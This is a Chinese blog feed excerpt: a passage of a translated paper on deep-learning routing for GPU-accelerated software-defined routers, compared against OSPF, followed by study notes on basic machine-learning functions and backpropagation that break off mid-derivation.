<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于第一RBM的可见层满足3.2节中提到的高斯分布，为了训练第一个RBM，我们需要分别计算表示标准偏差和单位i的平均值的$\sigma_i$和$(a_i + \sigma\sum_j h_j w_{ji})$。 该步骤需要$2N(m - 1)\ ADD，Nm\ SUB，Nm\ MUL，2N\ DIV和N\ SQRT$操作。 还应注意，当训练第一RBM时，应将可见层的条件概率分布修改为等式15.第一RBM与其他RBM的时间成本的差异可忽略不计。</p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在完成第一步的复杂性分析之后，我们转向第二步，其采用等式18中定义的成本函数的随机梯度下降来微调权重和偏差的值。算法4中显示了第二步的详细过程，主要包括四个操作：前馈传递（步骤3到步骤11），反向传播（步骤12到步骤19），更新$w，b$的值（步骤20到步骤27），并计算成本函数（步骤29至步骤43）。如从步骤3到步骤11的前馈过程所示，计算每层中每个单元的加权值$z_j^{(l)}$和激活值$u_j^{(l)}$。这里选择的激活函数是$sigmoid$函数，然后$u_j^{(l)} &#x3D; 1&#x2F;(1 + e^{-z_j^{(l)}})$。因此，我们可以得到最后一层的误差$\delta_i^{(L)}$，它被定义为最后一层和标记输出的激活值之间的差异，如步骤13所示。作为最后一层中的单位值是第一层中单位的值逐层传播的结果，最后一层的误差是由先前层的误差引起的。步骤15至步骤19显示如何利用第$l^{th}$层的误差$\delta_i^{(l)}$，根据两层之间的关系计算第$(l - 1)^{th}$层的误差$\delta_i^{(l - 1)}$，这是一个向后传播过程。然后，根据步骤20到27，可以采用每层的误差$\delta_i^{(l)}$来更新$w，b$的值。在获得$w，b$的更新值之后，我们可以重新计算其值。成本函数$C$，其步骤从步骤29到43显示。然后，可以确认是否应该根据$C$的值执行新的迭代。如果我们假设算法迭代$r_2$次，则总时间成本是$r_2((4m + 1)\sum_{l &#x3D; 2}^L n_l n_{l - 1} - mn_1 n_2 + m(\sum_{l &#x3D; 2}^L n_l + 2n_L) + 1)ADD + r_2 m(2\sum_{l &#x3D; 2}^L n_l n_{l - 1} - n_1 n_2 + \sum_{l &#x3D; 2}^L n_l + 4n_L)SUB + r_2((8m + 1)\sum_{l &#x3D; 2}^L n_l n_{l - 1} - mn_1 n_2 + m\sum_{l &#x3D; 2}^L n_l + 2mn_L + 1)MUL + r_2(2\sum_{l &#x3D; 2}^L n_l + 2)DIV$</p>
<img src = "2019_01_15_08.png" width = 80%>

<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在获得用于训练每个DBA的不同操作数的数量之后，我们理论上可以分析利用GPU（Nvidia Titan X Pascal）或价格可比较的CPU（Intel i7-6900K）来执行计算的时间成本。 GPU，Titan X，有28个SM，每个SM可以在一个时钟周期内运行128次32位浮点运算。 CPU，Intel i7-6900K，有8个内核和16个线程。我们选择的不同算术操作数的延迟分别为$ADD&#x2F;SUB，MUL和DIV$操作的3个，5个和15个时钟周期[35]。由于$EXP，SQRT和NEG$操作数的数量远少于其他操作数的数量，因此忽略这些操作数EXP，SQRT和NEG的时间成本是合理的。训练样本的数量是100000$(m &#x3D; 100000)$，并且$r_1$和$r_2$的值都假设为10000。然后，我们可以计算在GPU和CPU上运行的算法的时间成本值，如图5所示。可以发现基于GPU的SDR的时间成本的对数值小于2小而不是基于CPU的。这表明基于GPU的SDR用于训练所提出的深度学习架构，其性能比基于CPU的SDR快100多倍。尽管当路由器数量为1000时基于GPU的SDR的时间成本超过1000秒，但SDR的训练阶段可以离线操作以避免网络性能下降。</p>
<img src = "2019_01_15_09.png" width = 80%>
- 图5：所选GPU和基于CPU的SDR的培训阶段的时间成本

<img src = "2019_01_15_10.png" width = 80%>
- 图6：所选GPU和基于CPU的SDR的运行阶段的时间成本

<h2 id="5-2-运行阶段的复杂性分析"><a href="#5-2-运行阶段的复杂性分析" class="headerlink" title="5.2 运行阶段的复杂性分析"></a>5.2 运行阶段的复杂性分析</h2><p>在本节中，我们将分析在运行阶段提出的路由策略的时间成本。如上所述，训练阶段可以被视为SDR的初始化时段。因此，SDR主要在运行阶段工作。运行阶段的详细过程是前馈传播，可以认为与算法4中的步骤3到11相同。如前面第4.3节所述，运行阶段仅在边缘路由器中执行，并且每个边缘路由器仅构造从自身到所有其他边缘路由器的路径。因此，在运行阶段，每个边缘路由器只需要运行DBA，DBA计算其路径中存在的下一个节点。由于一条路径中路由器数量的不确定性，有必要假设一条路径中的平均节点数为A.因此，每个边缘路由器都需要运行$(N-I-1)A\ DBAs$。因此，每个边缘路由器构造其路径的时间成本是$(N - 1 - 1)A \sum_{l &#x3D; 2}^L n_l(n_{l-1} + 1)ADD + (N - I - 1)A \sum_{l &#x3D; 2}^L n_l n_{l - 1} MUL + (N - I - 1)A \sum_{l &#x3D; 2}^L n_l(DIV + EXP + NEG)$。</p>
<p>然后，我们可以计算所选GPU和基于CPU的SDR上运行阶段的时间成本值，如图6所示.$A$的值设置为$0.2N$。 由于GPU的时间成本的对数值比CPU的时间成本小约2，因此使用GPU比使用基于CPU的SDR运行算法快约100倍。 我们可以发现，当路由器的数量小于400时，GPU的时间成本小于1毫秒，而CPU的时间成本大于100毫秒。 这表明所提出的基于深度学习的路由策略在GPU加速SDR中运行得非常快。</p>
<p>除了复杂性分析之外，在下一节中，我们还进一步提出了基于仿真的网络性能评估，该评估基于商用路由器构建的骨干网上我们提出的基于深度学习的路由技术。</p>
<h1 id="6-网络性能评估"><a href="#6-网络性能评估" class="headerlink" title="6. 网络性能评估"></a>6. 网络性能评估</h1><p>本节评估了我们提出的基于深度学习的路由策略在网络性能方面的有效性。为了适应我们对输入和输出的表征，使用了C ++ &#x2F; WILL-API [16]，因为它提供了DBA库，这在其他模拟器中是不可用的，例如Caffe和Microsoft Cognitive Toolkit [36]。因此，我们使用C ++ &#x2F; WILL-API作为仿真框架。在模拟中，所有路由器的计算都在具有六核i7 3.3 Ghz处理器和16 GB RAM的工作站上进行。由于我们考虑的网络中所有路由器的计算都外包给一台机器，因此将模拟限制在小型网络是合理的。因此，我们考虑如图2所示的中型有线骨干网络，而不是全尺寸核心网络拓扑。值得注意的是，这种模拟规模足以证明所提出的基于深度学习的路由策略优于诸如OSPF的传统路由策略。如第3.1节所述，只有边缘路由器生成数据包，这些数据包发往边缘路由器，而内部路由器只转发数据包。另一方面，所有路由器都可以生成信令包。此外，信令数据包由流量模式组成，并且发往我们提案中的边缘路由器，而所有路由器都使用OSPF信令数据包来交换OSPF协议中的路由表。数据包和信令包的大小设置为1 kb。链路容量设置为20 Gbps。在这里，我们假设每个路由器都有一个无限的缓冲区。如前所述，我们需要使用DBA的监督培训，培训数据应包括流量数据和后续节点。然而，公共网站[34]提供的最实际的流量跟踪包括混合的路由协议，这些协议很难用于监督培训。此外，由于本文的目的是评估将深度学习应用于路由的性能，因此选择现有的路由协议作为仿真的基准是合理的。由于实际交通数据来自使用混合路由协议的网络，如果我们使用数据来训练我们的深度学习架构，那么将所提出的路由策略的性能与我们考虑的基准路由协议进行比较是不公平的。因此，在我们的模拟中，我们首先运行OSPF协议，在所考虑的网络中构建路由表，并记录流量模式和相应的路径。因此，我们可以利用记录的流量模式和相应的路径来构建标记数据，以便在训练阶段训练DBA。</p>
<img src = "2019_01_15_11.png" width = 80%>
- 图7：不同DBA的均方误差（MSEs）。

<p>在本节中，我们首先评估给定核心网络的DBA的精度，然后我们决定隐藏层的数量和每个隐藏层所需的单元数。 我们还对输入和输出的不同特征描述策略进行了比较，并证明我们的提议具有最高的精度和最低的复杂性。 然后，从三个方面将我们提出的路由策略的网络性能与OSPF的网络性能进行比较，即信令开销，网络吞吐量和每跳的平均延迟。</p>
<h2 id="6-1-DBA精度分析"><a href="#6-1-DBA精度分析" class="headerlink" title="6.1 DBA精度分析"></a>6.1 DBA精度分析</h2><p>由于图2所示网络中的路由器数量为16，因此对于每个DBA，输入和输出层中的单元数均为16.在我们的模拟中，训练数据的数量为100,000。 为了确定每个DBA的隐藏层数和每个隐藏层中的单元数，我们培训不同的DBA。 测量DBA的预测误差率的均方误差（MSE）在图7中给出。可以注意到，由每层中的4层和16或18个单元组成的DBA具有最小的MSE值。 考虑到隐藏层中的更多单元意味着更复杂，我们选择DBA，其中每个隐藏层具有2个隐藏层和16个单元。</p>
<p>为了阐明我们提出的深度学习系统模型的输入和输出，请参考表2.该表给出了具有16个路由器的网络中五个结构的错误率。第一行表示集中式路由控制。输入是16个路由器的最后时间间隔中的流量模式，而输出给出网络中任何两个边缘路由器之间的整个路径。我们可以发现输出层中的单元数超过30,000，其结构变得极其复杂，导致精度差。以下两行中显示的结构都使用一个深度学习系统来输出整个路径。它们之间的主要区别如下。第二种结构使用16×16矩阵来显示路径，矩阵中的元素具有二进制值。另一方面，第三结构输出向量，其中一些元素的值表示在路径中选择的路由器。我们可以发现第二和第三结构的错误率分别高达70％和45％。如果我们选择下一个节点作为最后两行中指示的输出，我们可以发现错误率仅为5％。这两种结构使用我们提出的输入和输出模型，第四种结构使用仅1个时间间隔的流量模式，而最终结构使用三个时间间隔的流量模式作为输入。两个结构中的输出层均由16个单元组成，并输出16维向量，其中只有一个元素的值为1表示路径中的下一个路由器。尽管这两种结构具有相同的性能，但最终结构比第四种结构复杂得多，因为输入层中的单元更多。因此，与其他策略相比，我们选择的第四种结构具有最低的错误率和最简单的结构。</p>
<h2 id="6-2-网络性能分析"><a href="#6-2-网络性能分析" class="headerlink" title="6.2 网络性能分析"></a>6.2 网络性能分析</h2><p>在运行阶段，我们选择OSPF作为基准方法来比较所提出的基于深度学习的路由策略。为了比较各种网络负载下的性能，我们更改数据生成速率并记录网络信令开销，吞吐量和每跳平均延迟的值。信令间隔固定为0.25秒。图8（a）和图8（b）比较了当数据生成速率从1.44Gbps变为2.208Gbps时成功传送的信令分组的数量和网络吞吐量与两种路由策略。图8（c）比较了当数据生成速率从1.5168 Gbps增加到1.5744 Gbps时两种情况下每跳平均延迟的变化。在图8（a）中，我们可以发现在我们的提议中成功传送的信令分组的数量几乎保持不变，这是正常的，因为信令间隔和模拟时间都是固定的。然而，在使用传统OSPF协议的网络中，当数据生成速率大于1.536Gbps时，成功传送的信令分组的数量逐渐减少，这可以通过业务拥塞和随后增加的一些信令分组的丢失来解释。可以注意到，传统情况下的信令分组的数量远远高于我们的提议中的数量。这是因为在我们的提议中，每个路由器只需要将信令数据包发送到边缘路由器以计算路由路径，而在OSPF中，每个路由器都需要将信令数据包泛洪到网络中的所有其他路由器。信令分组数量的差异会影响网络吞吐量和每跳的平均延迟。图8（b）表明我们提案的吞吐量随数据生成速率线性增加。但是，在使用OSPF的网络中，吞吐量在数据生成速率达到1.536 Gbps之前线性增加，之后吞吐量增长相当缓慢。在图8（c）中更清楚地示出了两种路由策略中的性能差异，其示出了随着网络开销的增加，每跳的平均延迟的变化。可以观察到，当数据生成速率低于1.5456 Gbps时，由于我们的提议中的DBA使用来自OSPF的数据进行训练，因此两种情况下每跳的平均延迟几乎相同。因此，可以得出结论，我们的DBA培训是成功的，因为它可以提供与OSPF相同的输出。但是，在数据生成速率超过1.5456 Gbps之后，OSPF中每跳的平均延迟增加，而我们的提议仍然不受影响。这可以通过交通拥堵的发生来解释，当使用OSPF的网络中的数据生成速率高于1.5456 Gbps时，导致吞吐量降低并且每跳的平均延迟增加。相反，对于所示的数据生成速率，基于深度学习的所提出的路由策略实现了低得多的信令开销并且避免了业务拥塞问题。</p>
<img src = "2019_02_18_01.png" width = 80%>
- 图8：在信令开销，吞吐量和每跳平均延迟方面，我们的提议和基准方法（OSPF）中不同网络负载下的网络性能比较。

<img src = "2019_02_18_02.png" width = 80%>
- 图9：在信令开销，吞吐量和每跳平均延迟方面，我们的提议和基准方法（OSPF）中不同信令间隔下的网络性能比较。

<p>在利用各种数据生成速率分析网络性能之后，我们使用两种不同的路由策略进一步分析和比较不同信令开销对网络性能的影响。在这里，我们将数据生成速率固定为1.536 Gbps，并将信令间隔从260 ms更改为240 ms。图图9示出了当信令间隔分别为260ms，250ms和240ms时两种情况下的信令开销，吞吐量和每跳平均延迟的结果。在图9（a）中，我们可以发现我们的提议中的信令开销远低于OSPF的情况。在图中如图9（b）和9（c）所示，我们可以清楚地看到信令开销对两种情况的性能的影响。在图9（b）中，当信令间隔不同时，我们的提议的吞吐量几乎保持不变。另一方面，当信令间隔为240ms时，OSPF的吞吐量远低于信令间隔为260ms或250ms时的吞吐量。因此，可以推断当信令间隔是240ms时，使用OSPF对网络发生业务拥塞。图9（c）中的结果进一步证明了这一点，该结果表明，当信令间隔为240ms时，OSPF的每跳平均延迟几乎是信令间隔为260ms或250ms时的两倍。此外，我们可以发现，当信令间隔为260 ms或250 ms时，OSPF的每跳平均延迟几乎与我们的提议相同。</p>
<p>通过比较使用OSPF的网络性能和我们提出的基于深度学习的路由策略，我们可以发现我们提出的基于深度学习的路由策略具有更低的信令开销，从而实现更好的流量控制。我们的提议中信令开销较低的原因是只有边缘路由器而不是所有路由器都需要信令数据包，因为边缘路由器可以使用训练有素的DBA来构建整个路径，而内部路由器不需要信令数据包来计算下一个节点。但是，在具有OSPF的网络中，边缘路由器不能利用所有链路的当前权值来构建实际的整个路径，因为通过OSPF计算的路径仅适用于当前网络状态。但是在数据包传输过程中，网络流量正在发生变化，然后决定的路径变得不合适。另一方面，对于基于深度学习的路由策略，如果我们利用流量模式和实际路径来训练它们，DBA可以找到当前流量模式和真实路径之间的复杂关系。因此，边缘路由器可以利用训练有素的DBA来构建仅具有当前网络信息的整个路径。</p>
<h1 id="7-总结"><a href="#7-总结" class="headerlink" title="7. 总结"></a>7. 总结</h1><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在本文中，我们解释了重新思考核心路由器架构和骨干网络路由策略的重要性，以满足不断变化的网络需求并应对未来几天的大量流量增长。在这种情况下，我们探索了当前的SDR架构，并设想深度学习（最近作为一种有前途的机器学习技术出现）可用于计算路由路径而不是传统的路由协议。这可以大大改善骨干网络流量控制。考虑到当前GPU加速的SDR实现了大规模并行计算，我们提出了一种监督深度学习系统来利用流量模式直接计算路径，这与传统的基于规则的路由不同。仿真结果表明，所提出的基于深度学习的路由策略在网络分组传输吞吐量和每跳平均延迟方面优于传统OSPF，因为我们的提议具有低得多的信令开销。这表明路由计算从传统的基于规则的策略向深度学习的转变可以大大改善骨干网络控制。此外，我们分析了我们提出的路由策略的复杂性，以评估GPU加速的SDR比基于CPU的SDR更有效地运行所提出的算法。由于各种终端接入网络以获得不同类型的服务，我们未来的研究将尝试应用深度学习技术来建模多个网络指标之间的复杂关系，以便更好地进行路由路径管理。</p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Book</category>
      </categories>
  </entry>
  <entry>
    <title>机器学习中的算法笔记</title>
    <url>/blogs/2018-12-21-machineLearningAlgorithmNotes/</url>
    <content><![CDATA[<h1 id="一、机器学习的函数介绍"><a href="#一、机器学习的函数介绍" class="headerlink" title="一、机器学习的函数介绍"></a>一、机器学习的函数介绍</h1><h2 id="1-softmax函数"><a href="#1-softmax函数" class="headerlink" title="1. softmax函数"></a>1. softmax函数</h2><h3 id="函数形式"><a href="#函数形式" class="headerlink" title="函数形式"></a>函数形式</h3><p>$$ S_i &#x3D; \frac{e^{V_i}}{\sum\nolimits_{i}^{C}e^{V_i}} $$</p>
<p>其中， $ V_i $ 是分类器前级输出单元的输出。$ i $ 表示类别索引，总的类别个数为 $ C $ 。$ S_i $ 表示的是当前元素的指数与所有元素指数和的比值。Softmax 将多分类的输出数值转化为相对概率，更容易理解和比较。</p>
<h3 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h3><p>一个多分类问题，C &#x3D; 4。线性分类器模型最后输出层包含了四个输出值，分别是：</p>
<p>$$ V &#x3D; \begin{bmatrix} -3 \\ 2 \\ -1 \\ 0 \end{bmatrix} $$</p>
<p>经过Softmax处理后，数值转化为相对概率：</p>
<p>$$ S &#x3D; \begin{bmatrix} 0.0057 \\ 0.8390 \\ 0.0418 \\ 0.1135 \end{bmatrix} $$</p>
<p>很明显，Softmax 的输出表征了不同类别之间的相对概率。我们可以清晰地看出，$ S_1 &#x3D; 0.8390 $ ，对应的概率最大，则更清晰地可以判断预测为第2类的可能性更大。Softmax 将连续数值转化成相对概率，更有利于我们理解。</p>
<h2 id="2-sigmoid函数"><a href="#2-sigmoid函数" class="headerlink" title="2. sigmoid函数"></a>2. sigmoid函数</h2><h3 id="函数形式-1"><a href="#函数形式-1" class="headerlink" title="函数形式"></a>函数形式</h3><p>$$ \sigma(x) &#x3D; \frac{1}{1 + e^{-x}} $$</p>
<p>该函数的导数形式非常简单，为：</p>
<p>$$ \begin{aligned}<br>    \sigma(x)’ &amp; &#x3D; (\frac{1}{1 + e^{-x}})’ \\<br>    &amp; &#x3D; -\frac{-e^{-x}}{(1 + e^{-x})^2} \\<br>    &amp; &#x3D; \frac{1}{1 + e^{-x}} - \frac{1}{(1 + e^{-x})^2} \\<br>    &amp; &#x3D; \sigma(x)(1 - \sigma(x))<br>\end{aligned} $$</p>
<h3 id="函数性质"><a href="#函数性质" class="headerlink" title="函数性质"></a>函数性质</h3><p>函数图像</p>
<img src = "2018_12_26_03.png">

<p>函数值域为 $ (0, 1) $ ，用于将神经元的输出归一化，便于做二分类问题。在机器学习领域，将输出的值从 $ (-\infty, +\infty) $ 归一化到 $ (0, 1) $ 中，对于许多分类问题都是很好的函数，比如逻辑回归。</p>
<h1 id="二、传统机器学习算法"><a href="#二、传统机器学习算法" class="headerlink" title="二、传统机器学习算法"></a>二、传统机器学习算法</h1><h2 id="逻辑回归-Logistics-Regression"><a href="#逻辑回归-Logistics-Regression" class="headerlink" title="逻辑回归 Logistics Regression"></a>逻辑回归 Logistics Regression</h2><h3 id="函数形式和模型"><a href="#函数形式和模型" class="headerlink" title="函数形式和模型"></a>函数形式和模型</h3><p>$$ \hat{y} &#x3D; sigmoid(W^T X) &#x3D; \frac{1}{1 + e^{-W^T X}} $$</p>
<ul>
<li>函数输出为0到1之间的一个数，对于二分类问题可以理解为预测值为1的概率</li>
<li>使用时需要选定一个<strong>阈值</strong>来决定二分类问题，一般取0.5</li>
<li>二元逻辑回归就是sigmoid神经元</li>
</ul>
<h3 id="损失函数"><a href="#损失函数" class="headerlink" title="损失函数"></a>损失函数</h3><p>首先，对于一个样本 $ i $ 估计正确的概率为</p>
<p>$$ p_i &#x3D; \hat{y_i}^{y_i} (1 - \hat{y_i})^{1 - y_i} &#x3D; \left\{\begin{array}{cl}<br>    \hat{y_i}       &amp; y_i &#x3D; 1 \\<br>    1 - \hat{y_i}   &amp; y_i &#x3D; 0<br>\end{array}\right. $$</p>
<p>$ \hat{y_i} $ 为预测值， $ y_i $ 为实际值</p>
<p>对于一组样本，期望全部正确，使用<strong>最大似然估计</strong>——即将所有概率相乘得到概率</p>
<p>$$ p &#x3D; \prod_{i} \hat{y_i}^{y_i} (1 - \hat{y_i})^{1 - y_i} $$</p>
<p>方便计算，将乘法转化成为加法，左右取log</p>
<p>$$ log(p) &#x3D; \sum_{i} [y_i log (\hat{y_i}) + (1 - y_i) log (1 - \hat{y_i})] $$</p>
<p>期望这个数越大越好，但是一般计算取越小越好更方便，加上负号</p>
<p>$$ l &#x3D; \sum_{i} [-y_i log (\hat{y_i}) - (1 - y_i) log (1 - \hat{y_i})] $$</p>
<p>即为逻辑回归损失函数</p>
<h3 id="训练"><a href="#训练" class="headerlink" title="训练"></a>训练</h3><p>使用<a href="#gradient">梯度下降算法</a>，求</p>
<p>$$ \begin{aligned}<br>    \frac{\partial W^T X}{\partial w_i} &amp; &#x3D; \frac{\partial \sum_{i} w_i x_i}{\partial w_i} &#x3D; x_i, \\<br>    \frac{\partial l}{\partial w_i} &amp; &#x3D; \sum_{i} [-y_i \frac{\partial log (\hat{y_i})}{\partial w_i} - (1 - y_i) \frac{\partial log (1 - \hat{y_i})}{\partial w_i}] \\<br>    &amp; &#x3D; \sum_{i} [-y_i \frac{\frac{-1}{(1 + e^{-W^T X})^2} \cdot (-x_i e^{-W^T X})}{\frac{1}{1 + e^{-W^T X}}} - (1 - y_i) \frac{- \frac{-1}{(1 + e^{-W^T X})^2} \cdot (-x_i e^{-W^T X})}{1 - \frac{1}{1 + e^{-W^T X}}}] \\<br>    &amp; &#x3D; \sum_{i} [\frac{-y_i x_i e^{-W^T X}}{1 + e^{-W^T X}} + \frac{(1 - y_i) x_i}{1 + e^{-W^T X}}] \\<br>    &amp; &#x3D; \sum_{i} (\frac{x_i}{1 + e^{-W^T X}} - y_i x_i) \\<br>    &amp; &#x3D; \sum_{i} [(\hat{y_i} - y_i)x_i]<br>\end{aligned} $$</p>
<h1 id="三、神经网络"><a href="#三、神经网络" class="headerlink" title="三、神经网络"></a>三、神经网络</h1><h2 id="1-感知器（神经元）"><a href="#1-感知器（神经元）" class="headerlink" title="1. 感知器（神经元）"></a>1. 感知器（神经元）</h2><ul>
<li>神经网络的组成单元——神经元。</li>
<li>神经元也叫做感知器。</li>
<li>神经元和感知器的不同在于神经元的激活函数为 $ sigmoid $ 函数</li>
</ul>
<h3 id="模型"><a href="#模型" class="headerlink" title="模型"></a>模型</h3><img src = "2018_12_24_01.png">

<h3 id="函数形式-2"><a href="#函数形式-2" class="headerlink" title="函数形式"></a>函数形式</h3><ul>
<li><strong>输入权值</strong> 一个感知器可以接收多个<strong>输入</strong> $ (x_1, x_2, …, x_n | x_i \in R) $，每个输入上有一个<strong>权值</strong> $ w_i \in R $，此外还有一个<strong>偏置项</strong> $ b \in R $ 。</li>
<li><strong>激活函数</strong> 感知器的激活函数可以有很多选择，比如我们可以选择下面这个<strong>阶跃函数</strong> $ f $ 来作为激活函数：<br>$$ f(z) &#x3D; \left\{\begin{array}{ll}<br>  1 &amp; {z &gt; 0} \\<br>  0 &amp; otherwise<br>\end{array}\right. $$</li>
<li><strong>输出</strong> 感知器的输出用下面的公式计算<br>$$ y &#x3D; f(w \cdot x + b) $$</li>
</ul>
<h3 id="训练神经元"><a href="#训练神经元" class="headerlink" title="训练神经元"></a>训练神经元</h3><p>感知器规则</p>
<p>$$ w_i \leftarrow w_i + \Delta w_i \\<br>b \leftarrow b + \Delta b $$</p>
<p>其中</p>
<p>$$ \Delta w_i &#x3D; \eta(t - y)x_i \\<br>\Delta b &#x3D; \eta(t - y) $$</p>
<ul>
<li>$ t $ 为训练样本的实际值，也就是label</li>
<li>$ y $ 为感知器输出值</li>
<li>$ \eta $ 为学习速率，也就是rate</li>
</ul>
<h3 id="实例-1"><a href="#实例-1" class="headerlink" title="实例"></a>实例</h3><p>python编写感知器实现and运算符</p>
<p>Github: <a href="https://github.com/Githubwyb/zeroDeepLearning/tree/master/1.Perceptron">https://github.com/Githubwyb/zeroDeepLearning/tree/master/1.Perceptron</a></p>
<h2 id="2-线性单元"><a href="#2-线性单元" class="headerlink" title="2. 线性单元"></a>2. 线性单元</h2><h3 id="模型-1"><a href="#模型-1" class="headerlink" title="模型"></a>模型</h3><img src = "2018_12_25_02.png">

<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>与感知器一致，仅仅将激活函数改为线性函数 $ f(x) &#x3D; x $</p>
<h3 id="训练线性单元"><a href="#训练线性单元" class="headerlink" title="训练线性单元"></a>训练线性单元</h3><h4 id="目标函数"><a href="#目标函数" class="headerlink" title="目标函数"></a>目标函数</h4><p>线性单元所要达到的目标是预测结果和实际结果相同，可以定义单个样本误差为：</p>
<p>$$ e &#x3D; \frac{1}{2}(y - \bar y)^2 &#x3D; \frac{1}{2}(y - w \cdot x)^2 $$</p>
<p>其中 $ y $ 为实际值，$ \bar y $ 为预测值。线性单元的目标为使 $ e $ 达到最小。</p>
<p>实际情况中，样本有很多个，需要使一批样本的误差达到最小，定义整体误差 $ E $ ：</p>
<p>$$ \begin{aligned}<br>    E &amp; &#x3D; e_1 + e_2 + … + e_n \\<br>    &amp; &#x3D; \frac{1}{2}\sum_{i &#x3D; 1}^{n}(y_i - \bar y_i)^2 \\<br>    &amp; &#x3D; \frac{1}{2}\sum_{i &#x3D; 1}^{n}(y_i - w_i \cdot x_i)^2<br>\end{aligned} $$</p>
<p>训练线性单元目的即为将 $ E $ 变为最小</p>
<h4 id="梯度下降算法"><a href="#梯度下降算法" class="headerlink" title="梯度下降算法"></a><span id = "gradient">梯度下降算法</span></h4><p>为使整体误差下降到最小，需要改变 $ w $ 使预测值更接近于真实值。可以定义整体误差 $ E $ 为 $ w $ 的函数，利用梯度的方法使整体误差取极小值点。由于计算机没办法计算梯度，但是计算能力强大，可以使用尝试法接近极小值。引入渐进到极小值及<strong>梯度下降算法</strong>的公式，对每个 $ w $ 来说：</p>
<p>$$ w_{new} &#x3D; w_{old} -  \eta\nabla E(w_{old}) $$</p>
<p>对于 $ \nabla E $ ，有：</p>
<p>$$ \begin{aligned}<br>    \nabla E(w) &amp; &#x3D; \frac{1}{2}\sum_{i &#x3D; 1}^{n}\frac{\partial}{\partial w}(y_i - \bar{y_i})^2 \\<br>    &amp; &#x3D; \frac{1}{2}\sum_{i &#x3D; 1}^{n}\frac{\partial}{\partial w}(y_i - w \cdot x)^2 \\<br>    &amp; &#x3D; \frac{1}{2}\sum_{i &#x3D; 1}^{n}[- 2(y_i - w \cdot x)x] \\<br>    &amp; &#x3D; -\sum_{i &#x3D; 1}^{n}(y_i - \bar{y_i})x \\<br>\end{aligned} $$</p>
<p>所以，训练线性单元的规则为：</p>
<p>$$ w \leftarrow w + \eta\sum_{i &#x3D; 1}^{n}(y_i - \bar{y_i})x $$</p>
<h3 id="实例-2"><a href="#实例-2" class="headerlink" title="实例"></a>实例</h3><p>python编写线性单元实现线性预测</p>
<p>Github: <a href="https://github.com/Githubwyb/zeroDeepLearning/tree/master/2.LinearUnit">https://github.com/Githubwyb/zeroDeepLearning/tree/master/2.LinearUnit</a></p>
<h2 id="3-神经网络和反向传播算法"><a href="#3-神经网络和反向传播算法" class="headerlink" title="3. 神经网络和反向传播算法"></a>3. 神经网络和反向传播算法</h2><h3 id="神经元"><a href="#神经元" class="headerlink" title="神经元"></a>神经元</h3><p>神经元就是将感知器的激活函数更改为 $ sigmoid $ 函数：</p>
<img src = "2018_12_26_05.png">

<h3 id="神经网络"><a href="#神经网络" class="headerlink" title="神经网络"></a>神经网络</h3><img src = "2018_12_26_04.png">

<p>神经网络包含输入层、隐藏层和输出层，隐藏层可以有多层神经元构成，每一层神经元的输入为上一层神经元的输出。</p>
<p>上图所示的隐藏层只有一层，公式为：</p>
<p>$$ a_4 &#x3D; sigmoid(w_{41}x_1 + w_{42}x_2 + w_{43}x_3 + w_{44}x_4 + w_{4b}) \\<br>a_5 &#x3D; sigmoid(w_{51}x_1 + w_{52}x_2 + w_{53}x_3 + w_{54}x_4 + w_{5b}) \\<br>a_6 &#x3D; sigmoid(w_{61}x_1 + w_{62}x_2 + w_{63}x_3 + w_{64}x_4 + w_{6b}) \\<br>a_7 &#x3D; sigmoid(w_{71}x_1 + w_{72}x_2 + w_{73}x_3 + w_{74}x_4 + w_{7b}) $$</p>
<p>输出层为和输出 $ y $ 同维度的神经元组成，公式同上。</p>
<h3 id="神经网络的训练"><a href="#神经网络的训练" class="headerlink" title="神经网络的训练"></a>神经网络的训练</h3><p>现在，我们需要知道一个神经网络的每个连接上的权值是如何得到的。我们可以说神经网络是一个<strong>模型</strong>，那么这些权值就是模型的<strong>参数</strong>，也就是模型要学习的东西。然而，一个神经网络的连接方式、网络的层数、每层的节点数这些参数，则不是学习出来的，而是人为事先设置的。对于这些人为设置的参数，我们称之为**超参数(Hyper-Parameters)**。</p>
<h4 id="反向传播算法"><a href="#反向传播算法" class="headerlink" title="反向传播算法"></a>反向传播算法</h4><p>首先，对于整体神经网络来说，目标函数取输出层所有误差的平方和：</p>
<p>$$ E_d &#x3D; \frac{1}{2}\sum_{j \in n_{outputs}}(t_j - y_j)^2 $$</p>
<p>$ E_d $ 仅代表对于一个样本d的误差，训练规则同上的线性单元的训练使用的<a href="#gradient">梯度下降算法</a>：</p>
<p>$$ w_{ji} &#x3D; w_{ji} - \eta\frac{\partial E_d}{\partial w_{ji}} $$</p>
<p>计算 $ \frac{\partial E_d}{\partial w} $ 需要分输出层、隐藏层两种情况进行计算：</p>
<p>设一些变量的值</p>
<p>$$ \begin{aligned}<br>    net &amp; &#x3D; w \cdot x \\<br>    y &amp; &#x3D; sigmoid(net) \\<br>    \delta_j &amp; &#x3D; -\frac{\partial E_d}{\partial net_j} \\<br>    j &amp; ，神经元输出第j维 \\<br>    i &amp; ，神经元输入第i维 \\<br>    k &amp; ，神经网络隐藏层第k层 \\<br>    o &amp; ，神经网络的输出层<br>\end{aligned} $$</p>
<h5 id="输出层"><a href="#输出层" class="headerlink" title="输出层"></a>输出层</h5><p>由链式求导法则，</p>
<p>$$ \frac{\partial E_d}{\partial w_{ji}} &#x3D; \frac{\partial E_d}{\partial y_j}\frac{\partial y_j}{\partial net_j}\frac{\partial net_j}{\partial w_{ji}} $$</p>
<p>其中，</p>
